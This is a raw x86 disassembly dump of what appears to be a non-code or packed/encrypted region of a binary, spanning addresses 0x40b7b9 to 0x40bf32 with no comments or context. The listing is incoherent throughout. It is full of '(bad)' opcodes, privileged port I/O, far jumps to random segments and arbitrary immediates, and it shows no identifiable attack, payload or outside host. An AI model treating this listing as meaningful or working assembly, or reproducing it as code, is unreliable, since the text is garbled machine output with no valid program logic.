  40b7b9:	imul   esi,DWORD PTR [ebx-0x5ee9e291],0xd
  40b7c0:	mov    cs,WORD PTR [ebx]
  40b7c2:	mov    cl,0x90
  40b7c4:	mov    bl,0x25
  40b7c6:	fistp  WORD PTR [ecx]
  40b7c8:	or     BYTE PTR [edi],dh
  40b7ca:	mov    dl,BYTE PTR [edi+0x3eed964e]
  40b7d0:	mov    edi,0xb0612783
  40b7d5:	dec    ebp
  40b7d6:	ds ds and al,0x15
  40b7da:	xor    eax,DWORD PTR [ecx+0x62c4e5d3]
  40b7e0:	push   edx
  40b7e1:	and    DWORD PTR [edx+eax*8-0x79cb689a],ebp
  40b7e8:	shl    BYTE PTR [eax+0x5379ace7],0x48
  40b7ef:	mov    dl,0x55
  40b7f1:	test   eax,0x4bd6a3c1
  40b7f6:	adc    BYTE PTR [edx],0xae
  40b7f9:	dec    edi
  40b7fa:	cmc    
  40b7fb:	jle    0x40b7f6
  40b7fd:	adc    DWORD PTR [eax],eax
  40b7ff:	std    
  40b800:	pop    esi
  40b801:	scas   al,BYTE PTR es:[edi]
  40b802:	sar    BYTE PTR [edx],cl
  40b804:	fild   WORD PTR ds:0x230c0432
  40b80a:	(bad)  
  40b80b:	and    ah,bl
  40b80d:	adc    DWORD PTR [eax-0x3ca34ed8],0x6d288c32
  40b817:	sar    BYTE PTR [ebp+0x50],0xf
  40b81b:	lock ss aaa 
  40b81e:	adc    DWORD PTR [ecx+ecx*1],esp
  40b821:	outs   dx,BYTE PTR ds:[esi]
  40b822:	test   DWORD PTR [ecx-0x4f],esi
  40b825:	ja     0x40b7de
  40b827:	pop    ebx
  40b828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b829:	outs   dx,WORD PTR ds:[esi]
  40b82b:	inc    edx
  40b82c:	add    eax,0xfa4b681d
  40b831:	mov    dh,0xfc
  40b833:	clc    
  40b834:	mov    ds:0xcac221fa,al
  40b839:	xor    eax,DWORD PTR [eax]
  40b83b:	mov    ?,WORD PTR [edi-0x6c]
  40b83e:	xor    BYTE PTR ds:0x3a1b2719,0x33
  40b845:	cmp    eax,0x74aa1645
  40b84a:	ret    
  40b84b:	jnp    0x40b860
  40b84d:	fs aas 
  40b84f:	cmp    ah,dh
  40b851:	inc    esi
  40b852:	in     al,dx
  40b853:	js     0x40b819
  40b855:	test   BYTE PTR [ebx],dl
  40b857:	and    BYTE PTR [esi-0x1f],0xa0
  40b85b:	xchg   esp,eax
  40b85c:	jmp    0xfd01a5a4
  40b861:	sahf   
  40b862:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b863:	std    
  40b864:	sub    eax,0x44aa95c6
  40b869:	mov    al,0x12
  40b86b:	in     eax,0x89
  40b86d:	data16 stc 
  40b86f:	xchg   dl,cl
  40b871:	push   esi
  40b872:	(bad)  
  40b873:	pop    ds
  40b874:	mov    bh,0x5f
  40b876:	cdq    
  40b877:	sbb    eax,0xa7127f98
  40b87c:	dec    esp
  40b87d:	cli    
  40b87e:	add    al,0x48
  40b880:	xchg   edx,eax
  40b881:	or     cl,bl
  40b883:	xor    DWORD PTR [edx],0x6d
  40b886:	inc    ebp
  40b887:	in     eax,0xd4
  40b889:	xchg   edx,eax
  40b88a:	loopne 0x40b813
  40b88c:	adc    al,0xbe
  40b88e:	or     al,0x14
  40b890:	stos   DWORD PTR es:[edi],eax
  40b891:	ds jle 0x40b8f9
  40b894:	loop   0x40b8e5
  40b896:	mov    ds:0xdfba46d8,eax
  40b89b:	xor    esi,edx
  40b89d:	enter  0x818,0x43
  40b8a1:	adc    BYTE PTR [ebp-0x5],0xd8
  40b8a5:	(bad)  
  40b8a6:	cmp    dh,bh
  40b8a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8a9:	xchg   BYTE PTR [esi],cl
  40b8ab:	jmp    0x705036c7
  40b8b0:	mov    ds:0xf46877ed,al
  40b8b5:	sbb    eax,0xe02bd502
  40b8ba:	mov    ah,0x4d
  40b8bc:	and    BYTE PTR [edx],ah
  40b8be:	imul   ecx
  40b8c0:	inc    ebx
  40b8c1:	mul    DWORD PTR [ecx+0x6c9cc0c3]
  40b8c7:	pop    ecx
  40b8c8:	push   edx
  40b8c9:	addr16 inc edi
  40b8cb:	shl    BYTE PTR [ecx+0x6d],cl
  40b8ce:	or     al,BYTE PTR [edi-0xf054f9e]
  40b8d4:	inc    esi
  40b8d5:	push   edx
  40b8d6:	aad    0xd1
  40b8d8:	(bad)  
  40b8d9:	fdiv   QWORD PTR [ecx+0x56e7581e]
  40b8df:	pusha  
  40b8e0:	sbb    ecx,DWORD PTR [edx-0x7dc6f145]
  40b8e6:	fcomp  QWORD PTR [edi-0x60]
  40b8e9:	push   0xfca68920
  40b8ee:	sbb    BYTE PTR [ebx-0x7a6880de],bh
  40b8f4:	cmc    
  40b8f5:	pop    edx
  40b8f6:	fld    TBYTE PTR [edi+0x15d10941]
  40b8fc:	sbb    eax,0x3542385b
  40b901:	xor    BYTE PTR ds:[edx+0x33],dl
  40b905:	mov    al,0x1d
  40b907:	rcl    BYTE PTR [eax],0x4
  40b90a:	fst    QWORD PTR [ebx+0x5b]
  40b90d:	pushf  
  40b90e:	sub    edx,DWORD PTR [ecx-0xd]
  40b911:	push   esi
  40b912:	push   ecx
  40b913:	fild   WORD PTR ds:0x6735d84f
  40b919:	lds    eax,FWORD PTR [ebx]
  40b91b:	cmc    
  40b91c:	les    edx,FWORD PTR [edx-0x35]
  40b91f:	ret    
  40b920:	xor    al,0x9a
  40b922:	imul   edx,DWORD PTR [esi+0x22],0xffffffea
  40b926:	(bad)  
  40b927:	scas   eax,DWORD PTR es:[edi]
  40b928:	mov    al,ds:0xcecb5790
  40b92d:	pop    ebp
  40b92e:	pop    ss
  40b92f:	pop    ss
  40b930:	stos   DWORD PTR es:[edi],eax
  40b931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b932:	(bad)  
  40b933:	push   esp
  40b934:	retf   
  40b935:	loope  0x40b958
  40b937:	aad    0x8
  40b939:	xchg   BYTE PTR [ebx-0x39],cl
  40b93c:	ja     0x40b9a7
  40b93e:	imul   eax,DWORD PTR cs:[edi-0x1797b54b],0x20
  40b946:	xor    dl,BYTE PTR [eax-0x582347f3]
  40b94c:	int    0xe3
  40b94e:	dec    ebp
  40b94f:	push   0x68
  40b951:	and    dh,BYTE PTR [eax]
  40b953:	cmp    BYTE PTR [edi+0x19],bl
  40b956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b957:	test   DWORD PTR [edx-0x5fa5b3e7],edi
  40b95d:	sbb    al,0x57
  40b95f:	bound  edi,QWORD PTR [edi+0x62]
  40b962:	xchg   esp,eax
  40b963:	inc    DWORD PTR [edi-0x35]
  40b966:	mov    ?,WORD PTR [esi+0x4c]
  40b969:	test   BYTE PTR [ebx],dl
  40b96b:	or     DWORD PTR [edi+0x5c],esi
  40b96e:	pop    ebx
  40b96f:	pop    esp
  40b970:	cmp    BYTE PTR [ebx+0x27],bh
  40b973:	addr16 fwait
  40b975:	sub    al,0xc5
  40b977:	loope  0x40b9dc
  40b979:	cmp    ah,0x55
  40b97c:	scas   eax,DWORD PTR es:[edi]
  40b97d:	sti    
  40b97e:	repz test eax,0xabace5e0
  40b984:	xchg   dh,dl
  40b986:	sub    BYTE PTR ds:0xa6feded3,dl
  40b98c:	bound  edx,QWORD PTR [esp+ebx*2-0x18]
  40b990:	loop   0x40b98b
  40b992:	ins    DWORD PTR es:[edi],dx
  40b993:	pop    edi
  40b994:	add    eax,0x1922d2e9
  40b999:	adc    al,0xf4
  40b99b:	mov    ah,0xbd
  40b99d:	call   0x7b483763
  40b9a2:	repnz push ds
  40b9a4:	outs   dx,BYTE PTR ds:[esi]
  40b9a5:	cmp    BYTE PTR [ebp+edi*2+0x651baa1e],al
  40b9ac:	pop    ds
  40b9ad:	push   ecx
  40b9ae:	es repnz mov cl,0x40
  40b9b2:	pop    edi
  40b9b3:	cmp    eax,eax
  40b9b5:	in     eax,dx
  40b9b6:	cmp    al,0xab
  40b9b8:	inc    edi
  40b9b9:	dec    esi
  40b9ba:	mov    ebx,0xd4caba79
  40b9bf:	add    DWORD PTR [ebx+edi*1],edi
  40b9c2:	nop
  40b9c3:	jmp    0xfe59:0x8450e1d5
  40b9ca:	push   esp
  40b9cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9cc:	iret   
  40b9cd:	mov    dl,0x78
  40b9cf:	mov    bh,0xc7
  40b9d1:	pop    ebp
  40b9d2:	fimul  WORD PTR [esi]
  40b9d4:	(bad)  
  40b9d6:	rol    DWORD PTR [si-0x780b],0x43
  40b9dc:	outs   dx,DWORD PTR ds:[esi]
  40b9dd:	loop   0x40ba29
  40b9df:	adc    esp,DWORD PTR ds:0xe2e96e10
  40b9e5:	mov    cl,0xc0
  40b9e7:	imul   esi,DWORD PTR [bp+di],0xffffffb5
  40b9eb:	mov    ds:0x4e14f92a,al
  40b9f0:	arpl   WORD PTR [eax+edx*4],bx
  40b9f3:	cmc    
  40b9f4:	dec    edi
  40b9f5:	pop    esi
  40b9f6:	into   
  40b9f7:	add    eax,0x8c93445a
  40b9fc:	push   0x14fb739b
  40ba01:	daa    
  40ba02:	sbb    al,0x50
  40ba04:	ds ja  0x40b9aa
  40ba07:	push   edx
  40ba08:	shl    BYTE PTR [eax+0x332d30ca],0x76
  40ba0f:	leave  
  40ba10:	adc    bl,BYTE PTR [esi]
  40ba12:	js     0x40ba6f
  40ba14:	mov    dl,0xe6
  40ba16:	push   edx
  40ba17:	and    edi,edx
  40ba19:	int3   
  40ba1a:	in     eax,0xb0
  40ba1c:	pop    es
  40ba1d:	push   eax
  40ba1e:	test   al,0x7d
  40ba20:	lahf   
  40ba21:	push   esi
  40ba22:	mov    edi,0xfc4102d5
  40ba27:	sbb    BYTE PTR [edx-0x4],ah
  40ba2a:	pop    edx
  40ba2b:	popa   
  40ba2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba2d:	loop   0x40b9f5
  40ba2f:	add    ebp,DWORD PTR [ebp+0x37548d02]
  40ba35:	outs   dx,DWORD PTR ds:[esi]
  40ba36:	nop
  40ba37:	push   ebp
  40ba38:	jmp    0x40ba8c
  40ba3a:	dec    ebx
  40ba3b:	in     al,0x7
  40ba3d:	stos   BYTE PTR es:[edi],al
  40ba3e:	mov    esp,0x76387f60
  40ba43:	test   ah,bh
  40ba45:	data16 addr16 (bad) 
  40ba48:	mov    eax,0x72bd1b8d
  40ba4d:	(bad)  
  40ba4e:	cld    
  40ba4f:	outs   dx,BYTE PTR ds:[esi]
  40ba50:	lahf   
  40ba51:	jbe    0x40ba78
  40ba53:	sbb    BYTE PTR [si+0x10a4],0x7c
  40ba59:	xchg   ebp,eax
  40ba5a:	lods   eax,DWORD PTR ds:[esi]
  40ba5b:	mov    WORD PTR [edi],ss
  40ba5d:	rcr    BYTE PTR [ecx+0x57],0x2c
  40ba61:	sub    DWORD PTR [ecx-0x4b36c460],ecx
  40ba67:	loopne 0x40b9ed
  40ba69:	inc    ebx
  40ba6a:	in     eax,0xa0
  40ba6c:	(bad)  
  40ba6d:	not    BYTE PTR [eax]
  40ba6f:	hlt    
  40ba70:	sub    edi,edi
  40ba72:	mov    dl,0xbc
  40ba74:	sub    ecx,ebp
  40ba76:	mov    ah,0x34
  40ba78:	adc    BYTE PTR [ebx+0x53],bl
  40ba7b:	ret    0x4d40
  40ba7e:	in     al,dx
  40ba7f:	outs   dx,DWORD PTR ds:[esi]
  40ba80:	mov    esp,0xe003e0f1
  40ba85:	pop    edi
  40ba86:	adc    edi,DWORD PTR [edi]
  40ba88:	jno    0x40ba56
  40ba8a:	popa   
  40ba8b:	inc    esi
  40ba8c:	mov    eax,0x386460e6
  40ba91:	lahf   
  40ba92:	dec    ebp
  40ba93:	dec    esp
  40ba94:	jmp    0x919e:0x8b52d1e8
  40ba9b:	jmp    0x40bb05
  40ba9d:	add    ebp,esp
  40ba9f:	cmp    al,0x58
  40baa1:	dec    ebx
  40baa2:	fnstcw WORD PTR [ecx+0x33]
  40baa5:	nop
  40baa6:	jp     0x40ba3e
  40baa8:	sbb    DWORD PTR [ecx-0x67efa097],esi
  40baae:	and    eax,0x7b53c3a
  40bab3:	mov    edx,DWORD PTR [edi]
  40bab5:	mov    ecx,0x68ac503b
  40baba:	jge    0x40bb1a
  40babc:	xor    DWORD PTR [edi+0x2b],edi
  40babf:	out    dx,eax
  40bac0:	sahf   
  40bac1:	xchg   cl,bl
  40bac3:	leave  
  40bac4:	lds    eax,FWORD PTR [ebx-0x4e]
  40bac7:	in     al,dx
  40bac8:	mov    ebp,0x51387cf1
  40bacd:	scas   al,BYTE PTR es:[edi]
  40bace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bacf:	sbb    ebp,ebx
  40bad1:	mov    ds:0xfa85e374,al
  40bad6:	lahf   
  40bad7:	jmp    0x7487f2de
  40badc:	mov    eax,0x2407d975
  40bae1:	cdq    
  40bae2:	jo     0x40bb15
  40bae4:	jg     0x40ba98
  40bae6:	push   esp
  40bae7:	test   esp,ebp
  40bae9:	call   0xc0f0fa10
  40baee:	add    eax,0x99ddc0a
  40baf3:	or     al,0x45
  40baf5:	mov    ecx,0x4be4eddf
  40bafa:	cld    
  40bafb:	arpl   WORD PTR [esi+edx*1-0x9],si
  40baff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb00:	mov    esi,0x553ccd65
  40bb05:	pop    eax
  40bb06:	das    
  40bb07:	jae    0x40bb7f
  40bb09:	cmp    BYTE PTR [edi+0x2e85abcf],dl
  40bb0f:	add    dl,BYTE PTR [esp+ebx*4]
  40bb12:	ins    DWORD PTR es:[edi],dx
  40bb13:	jge    0x40bad0
  40bb15:	and    eax,0x1fe5778
  40bb1a:	xchg   DWORD PTR [ebx+0x2dc8772d],eax
  40bb20:	add    edx,DWORD PTR [eax]
  40bb22:	sar    ah,cl
  40bb24:	ss inc esi
  40bb26:	push   edx
  40bb27:	and    edx,DWORD PTR [edi]
  40bb29:	cdq    
  40bb2a:	or     DWORD PTR [ebp-0x3ddcdc90],ecx
  40bb30:	aam    0xe1
  40bb32:	(bad)  
  40bb33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb34:	in     al,0x49
  40bb36:	push   esp
  40bb37:	call   0x1df43e92
  40bb3c:	xchg   BYTE PTR [eax],dh
  40bb3e:	popa   
  40bb3f:	je     0x40bad6
  40bb41:	lock out dx,al
  40bb43:	pop    ss
  40bb44:	shl    edi,cl
  40bb46:	lds    ecx,FWORD PTR [edx-0x35309a18]
  40bb4c:	or     edi,DWORD PTR [edi]
  40bb4e:	test   eax,0x5097abc9
  40bb53:	xor    ebp,DWORD PTR [edx]
  40bb55:	mov    WORD PTR ds:0xaf1a6a11,cs
  40bb5b:	rol    esp,1
  40bb5d:	test   eax,0x97cb760b
  40bb62:	inc    ebp
  40bb63:	xor    BYTE PTR [ebx],ch
  40bb65:	daa    
  40bb66:	and    DWORD PTR [ebp+0x7e],ecx
  40bb69:	cmp    esi,DWORD PTR [ebx-0x1c]
  40bb6c:	or     al,0x3
  40bb6e:	jle    0x40bbac
  40bb70:	or     BYTE PTR [ebx],dh
  40bb72:	call   0x1ab:0x469cbac5
  40bb79:	in     eax,0xe8
  40bb7b:	mov    ecx,DWORD PTR [esi]
  40bb7d:	jno    0x40bb64
  40bb7f:	cmp    DWORD PTR [ebp-0x2f620cc],0xffffffc5
  40bb86:	ss sahf 
  40bb88:	sub    eax,0xbc85571a
  40bb8d:	shl    DWORD PTR [esi+0x19],1
  40bb90:	cmp    al,BYTE PTR ds:0x7bd688f
  40bb96:	xor    al,0x23
  40bb98:	mov    dh,dl
  40bb9a:	mov    eax,ds:0x39b1a239
  40bb9f:	mov    ?,WORD PTR [edx]
  40bba1:	jo     0x40bc1e
  40bba3:	(bad)  
  40bba4:	and    al,0x5a
  40bba6:	cwde   
  40bba7:	repz mov edi,DWORD PTR [ebx-0x31]
  40bbab:	inc    esp
  40bbac:	sub    ah,BYTE PTR [eax]
  40bbae:	xor    al,0xe6
  40bbb0:	dec    ecx
  40bbb1:	add    al,0xbd
  40bbb3:	fistp  QWORD PTR ds:[esi-0x237d6b31]
  40bbba:	adc    ebx,ebx
  40bbbc:	xor    al,0x50
  40bbbe:	dec    edx
  40bbbf:	cwde   
  40bbc0:	inc    ebp
  40bbc1:	jb     0x40bbe8
  40bbc3:	popf   
  40bbc4:	mov    DWORD PTR [ebp+edi*8+0x69],0xfc7a03f4
  40bbcc:	lea    edi,[eax-0x1c9632ae]
  40bbd2:	jne    0x40bbcc
  40bbd4:	mov    edx,cs
  40bbd6:	rcr    BYTE PTR [eax+0x75],cl
  40bbd9:	pop    edi
  40bbda:	xor    al,0x30
  40bbdc:	push   ebp
  40bbdd:	sub    DWORD PTR [ecx-0x61],ecx
  40bbe0:	fs pop esp
  40bbe2:	mov    eax,0xc00add2f
  40bbe7:	adc    DWORD PTR [esp+edx*4],esp
  40bbea:	dec    DWORD PTR [eax-0x522643b]
  40bbf0:	gs jo  0x40bbe4
  40bbf3:	mov    edi,0xfddbee03
  40bbf8:	out    0x3d,al
  40bbfa:	push   0xffffff83
  40bbfc:	pop    edi
  40bbfd:	and    ebp,DWORD PTR [edx+eiz*4-0x6c]
  40bc01:	fadd   QWORD PTR [ecx]
  40bc03:	pop    edi
  40bc04:	fadd   st,st(6)
  40bc06:	cmp    bl,al
  40bc08:	add    BYTE PTR [eax-0x4d],bl
  40bc0b:	add    BYTE PTR [edi-0x5e],al
  40bc0e:	inc    edi
  40bc0f:	xor    BYTE PTR [esi-0x1],dh
  40bc12:	idiv   DWORD PTR [edx-0x14]
  40bc15:	inc    esp
  40bc16:	and    ch,BYTE PTR [ebp+0x10]
  40bc19:	dec    esp
  40bc1a:	arpl   WORD PTR [esi],cx
  40bc1c:	arpl   WORD PTR [ebp+0x19],di
  40bc1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc20:	hlt    
  40bc21:	cdq    
  40bc22:	mov    bl,0x9e
  40bc24:	lds    esp,FWORD PTR ds:0x225d64f0
  40bc2a:	jno    0x40bbb4
  40bc2c:	pop    esi
  40bc2d:	nop
  40bc2e:	mov    eax,0x56b5c78f
  40bc33:	pop    ebx
  40bc34:	(bad)  
  40bc36:	sti    
  40bc37:	(bad)  
  40bc38:	jmp    0xb821:0xd8f95a2f
  40bc3f:	rcl    DWORD PTR [ebx-0x21],0x76
  40bc43:	xor    dl,BYTE PTR [edi+0x1c]
  40bc46:	or     BYTE PTR [ebp-0x6fcd5aa4],0xa3
  40bc4d:	imul   ebp,DWORD PTR [ebp*1-0x552ecb14],0xb3efbe55
  40bc58:	and    bh,BYTE PTR [esi+0x3560c75c]
  40bc5e:	cmp    eax,0xab57da9d
  40bc63:	pop    ds
  40bc64:	pop    edx
  40bc65:	pushf  
  40bc66:	(bad)  
  40bc67:	cld    
  40bc68:	add    dh,BYTE PTR [ebx]
  40bc6a:	fist   WORD PTR [edi+0x23c485f6]
  40bc70:	(bad)  
  40bc71:	mov    ebx,0x7150043e
  40bc76:	mov    esi,?
  40bc78:	dec    eax
  40bc79:	sti    
  40bc7a:	add    BYTE PTR [ecx-0x1b],ah
  40bc7d:	loop   0x40bc1e
  40bc7f:	js     0x40bc44
  40bc81:	fisub  DWORD PTR [ebp-0x5d]
  40bc84:	hlt    
  40bc85:	jno    0x40bcda
  40bc87:	popa   
  40bc88:	out    dx,al
  40bc89:	pop    ebx
  40bc8a:	mov    ch,0x11
  40bc8c:	jmp    0xef566e18
  40bc91:	inc    edi
  40bc92:	icebp  
  40bc93:	ja     0x40bd0e
  40bc95:	sti    
  40bc96:	ins    DWORD PTR es:[edi],dx
  40bc97:	scas   eax,DWORD PTR es:[edi]
  40bc98:	dec    esi
  40bc99:	push   esi
  40bc9a:	rep ins BYTE PTR es:[edi],dx
  40bc9c:	and    eax,eax
  40bc9e:	cmp    DWORD PTR [ebx+0x4697773f],ebx
  40bca4:	jo     0x40bc88
  40bca6:	jae    0x40bca2
  40bca8:	ret    
  40bca9:	(bad)  
  40bcaa:	retf   0x5557
  40bcad:	shl    al,cl
  40bcaf:	sub    edi,DWORD PTR [ecx-0x6f]
  40bcb2:	mov    al,0x67
  40bcb4:	call   0x2458:0xc10ad4a0
  40bcbb:	shr    DWORD PTR [esi+0x3f],0xf6
  40bcbf:	sub    ecx,ecx
  40bcc1:	in     eax,0x7f
  40bcc3:	and    bh,BYTE PTR [edx+0x27]
  40bcc6:	add    esi,edi
  40bcc8:	ins    DWORD PTR es:[edi],dx
  40bcc9:	push   ss
  40bcca:	arpl   WORD PTR [esi+0x122306ee],di
  40bcd0:	ins    DWORD PTR es:[di],dx
  40bcd2:	xchg   DWORD PTR [ebp+0x7f5dc5cd],ebp
  40bcd8:	js     0x40bd16
  40bcda:	add    eax,0x64cbb932
  40bcdf:	push   ebx
  40bce0:	mov    esp,0x3e3bc5b6
  40bce5:	inc    ebp
  40bce6:	mov    cl,0x55
  40bce8:	mov    esi,0x30de6a23
  40bced:	add    DWORD PTR [ebx+0xb6af5ff],edx
  40bcf3:	mov    cl,0x5c
  40bcf5:	test   al,0xa1
  40bcf7:	mov    ecx,0x74f809df
  40bcfc:	popa   
  40bcfd:	mov    BYTE PTR [ebp+0x1704b22b],ch
  40bd03:	adc    bh,cl
  40bd05:	jp     0x40bd4c
  40bd07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd08:	or     BYTE PTR [esi-0x67840260],bl
  40bd0e:	ficomp DWORD PTR [eax]
  40bd10:	stos   BYTE PTR es:[edi],al
  40bd11:	sahf   
  40bd12:	aas    
  40bd13:	push   esp
  40bd14:	sbb    DWORD PTR [ecx-0x99460c3],ebx
  40bd1a:	hlt    
  40bd1b:	or     ecx,DWORD PTR [eax+0x7b7db78d]
  40bd21:	dec    edi
  40bd22:	or     BYTE PTR [ebp+0x67],ah
  40bd25:	pop    es
  40bd26:	jle    0x40bd0e
  40bd28:	gs mov bh,0x46
  40bd2b:	jno    0x40bd35
  40bd2d:	xor    BYTE PTR [ebx-0x70],dl
  40bd30:	mov    bl,0x4f
  40bd32:	outs   dx,BYTE PTR ds:[esi]
  40bd33:	push   cs
  40bd34:	mov    edi,DWORD PTR [eax]
  40bd36:	int3   
  40bd37:	mov    es,WORD PTR ds:0x1145ac01
  40bd3d:	aam    0xbd
  40bd3f:	data16 test BYTE PTR [edx-0x1e],bh
  40bd43:	(bad)  
  40bd44:	sahf   
  40bd45:	sub    ecx,edx
  40bd47:	mov    dl,0x7e
  40bd49:	cli    
  40bd4a:	sbb    bh,BYTE PTR [ebx-0x80]
  40bd4d:	cmp    DWORD PTR [ebx+0x52],0xffffffa5
  40bd51:	mov    edx,0x78ed4f85
  40bd56:	and    BYTE PTR [eax],bl
  40bd58:	adc    DWORD PTR [ecx+0x1b447c9b],esi
  40bd5e:	push   edx
  40bd5f:	mov    cl,0x71
  40bd61:	enter  0x298c,0x81
  40bd65:	hlt    
  40bd66:	pop    es
  40bd67:	cmp    ecx,DWORD PTR [ecx-0x752440f6]
  40bd6d:	push   0xfadda310
  40bd72:	cdq    
  40bd73:	test   DWORD PTR [eax-0x2be16531],ecx
  40bd79:	add    DWORD PTR [esi-0x1f],eax
  40bd7c:	addr16 pop ebp
  40bd7e:	and    eax,0x2db11e32
  40bd83:	call   0x24aa:0x646cf700
  40bd8a:	lahf   
  40bd8b:	enter  0x4c27,0x16
  40bd8f:	xor    eax,0xb4b5ce2
  40bd94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd95:	inc    eax
  40bd96:	aaa    
  40bd97:	push   cs
  40bd98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd99:	retf   0xe545
  40bd9c:	(bad)  
  40bd9d:	adc    eax,0x90fa91bb
  40bda2:	push   es
  40bda3:	and    DWORD PTR [ebx],0x2ad4a3ee
  40bda9:	repnz push esi
  40bdab:	sub    esi,DWORD PTR [esi]
  40bdad:	stos   BYTE PTR es:[edi],al
  40bdae:	cmp    DWORD PTR [esi-0x6f48e037],0xffffffd0
  40bdb5:	jge    0x40bd66
  40bdb7:	and    DWORD PTR [ebp-0x76788efb],eax
  40bdbd:	mov    al,ds:0xaeb556bf
  40bdc2:	adc    eax,0x87475bec
  40bdc7:	or     eax,0x1b4bae2b
  40bdcc:	aas    
  40bdcd:	cli    
  40bdce:	in     eax,0x9c
  40bdd0:	test   ebx,ebp
  40bdd2:	cmp    bh,BYTE PTR [edx]
  40bdd4:	in     eax,0xf3
  40bdd6:	cmp    al,0x13
  40bdd8:	pop    ecx
  40bdd9:	je     0x40be03
  40bddb:	pop    eax
  40bddc:	imul   ebp,DWORD PTR [edx],0xf87656
  40bde2:	fdiv   st(0),st
  40bde4:	aad    0x9d
  40bde6:	mov    ebx,0xb1d6462f
  40bdeb:	in     eax,dx
  40bdec:	mov    edx,0xef0605fe
  40bdf1:	xchg   ebp,eax
  40bdf2:	in     al,dx
  40bdf3:	jp     0x40bdc4
  40bdf5:	daa    
  40bdf6:	sar    BYTE PTR [edx-0x661afe1a],cl
  40bdfc:	retf   
  40bdfd:	cmp    BYTE PTR [ecx-0x78239e30],0x9e
  40be04:	inc    esp
  40be05:	or     BYTE PTR [ecx-0xa],dl
  40be08:	mov    al,al
  40be0a:	pop    edi
  40be0b:	mov    dl,0xc9
  40be0d:	cmp    cl,ah
  40be0f:	int3   
  40be10:	jle    0x40be14
  40be12:	pop    ebx
  40be13:	lea    ebp,[eax]
  40be15:	mov    esp,0xf8ff04ce
  40be1a:	add    ebx,ebx
  40be1c:	add    esp,DWORD PTR [ecx+ebp*1-0x2b]
  40be20:	and    cl,BYTE PTR [edi]
  40be22:	std    
  40be23:	dec    ebp
  40be24:	cmp    eax,0x7be3a2d7
  40be29:	add    dh,0x86
  40be2c:	sub    DWORD PTR [esi+0x12bc88e7],ebp
  40be32:	mov    ecx,0xf5789385
  40be37:	xchg   ebx,eax
  40be38:	mov    ch,0x92
  40be3a:	aaa    
  40be3b:	xchg   DWORD PTR [edx],edi
  40be3d:	xchg   ebx,eax
  40be3e:	call   0xec5f:0x9d868349
  40be45:	(bad)  
  40be46:	pop    esp
  40be47:	mov    ebx,0x6727e55d
  40be4c:	repnz fcmovb st,st(3)
  40be4f:	inc    ebp
  40be50:	add    DWORD PTR [edx],esp
  40be52:	jecxz  0x40bde0
  40be54:	mov    ds:0xe6423150,eax
  40be59:	pop    ebp
  40be5a:	enter  0x7923,0xba
  40be5e:	and    al,0xfd
  40be60:	cmp    eax,0x942cacfd
  40be65:	cmp    eax,0x6c03784b
  40be6a:	jne    0x40be6b
  40be6c:	jmp    0xc574:0xd44c017b
  40be73:	xchg   DWORD PTR fs:[esi-0x7d],esp
  40be77:	xchg   ebp,eax
  40be78:	add    eax,0x2143c677
  40be7d:	mov    ebx,0x37bd0217
  40be82:	out    0x90,al
  40be84:	lahf   
  40be85:	sbb    eax,0x92ecf2f8
  40be8a:	mov    dh,0x76
  40be8c:	mov    ds:0xd7e98095,eax
  40be91:	or     eax,0xced24918
  40be96:	call   0x71b309c5
  40be9b:	test   BYTE PTR [ebx+0x45],dl
  40be9e:	ins    BYTE PTR es:[edi],dx
  40be9f:	and    ebx,DWORD PTR [edx-0x63]
  40bea2:	out    0xa5,al
  40bea4:	mov    ebx,0xf2fb772d
  40bea9:	adc    DWORD PTR [eax],edx
  40beab:	mov    ecx,0x2a3b86ff
  40beb0:	mov    BYTE PTR [ecx-0x2a],al
  40beb3:	mov    al,ds:0x1eb9e8ef
  40beb8:	data16 fdiv DWORD PTR ds:[edx+0x58]
  40bebd:	(bad)  
  40bebe:	ins    DWORD PTR es:[edi],dx
  40bebf:	dec    edx
  40bec0:	inc    edi
  40bec1:	adc    DWORD PTR [esi-0x3bac1bec],esi
  40bec7:	(bad)  
  40bec8:	adc    DWORD PTR [bx-0x4d48],ebx
  40becd:	repnz loope 0x40bf45
  40bed0:	retf   0x534b
  40bed3:	mov    BYTE PTR [edx-0x27aa7829],cl
  40bed9:	adc    al,0xc5
  40bedb:	stos   BYTE PTR es:[edi],al
  40bedc:	pusha  
  40bedd:	jno    0x40bea6
  40bedf:	pop    ebp
  40bee0:	mov    ah,0xed
  40bee2:	cwde   
  40bee3:	xchg   edx,eax
  40bee4:	add    eax,0xc0da50cb
  40bee9:	dec    ebp
  40beea:	push   0x6a451073
  40beef:	jo     0x40bf65
  40bef1:	inc    eax
  40bef2:	pop    esi
  40bef3:	daa    
  40bef4:	sub    BYTE PTR [eax],ch
  40bef6:	and    DWORD PTR ds:0xc82f6dcf,ebx
  40befc:	sbb    al,0xd0
  40befe:	adc    BYTE PTR [ecx+0x18],ah
  40bf01:	mov    ds:0x54b12ab6,eax
  40bf06:	jl     0x40bf75
  40bf08:	mov    al,0x99
  40bf0a:	fwait
  40bf0b:	sub    DWORD PTR [ecx],esi
  40bf0d:	cwde   
  40bf0e:	pop    edx
  40bf0f:	jle    0x40bebe
  40bf11:	aas    
  40bf12:	lea    esp,[eax-0x75dd16dc]
  40bf18:	or     DWORD PTR [esi],esi
  40bf1a:	jmp    0xbc92ff2c
  40bf1f:	sub    edx,DWORD PTR [edx]
  40bf21:	fmul   st(6),st
  40bf23:	xchg   ecx,eax
  40bf24:	cwde   
  40bf25:	inc    ebp
  40bf26:	push   ss
  40bf27:	addr16 enter 0xc4ed,0x94
  40bf2c:	dec    ecx
  40bf2d:	sub    BYTE PTR [ebp+0x24],ch
  40bf30:	push   edi
  40bf31:	(bad)  
  40bf32:	and    ecx,DWORD PTR [ebx]
